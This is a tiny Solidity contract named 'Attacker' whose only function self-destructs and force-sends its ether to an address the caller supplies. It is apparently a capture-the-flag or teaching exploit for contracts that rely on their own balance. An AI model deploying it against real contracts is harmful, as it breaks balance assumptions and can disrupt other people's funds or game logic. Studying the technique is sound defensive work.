// SPDX-License-Identifier: MIT
pragma solidity ^0.7.4;

contract Attacker {
    
    function fire(address payable _force) external payable {
        selfdestruct(_force);
    }
    
}
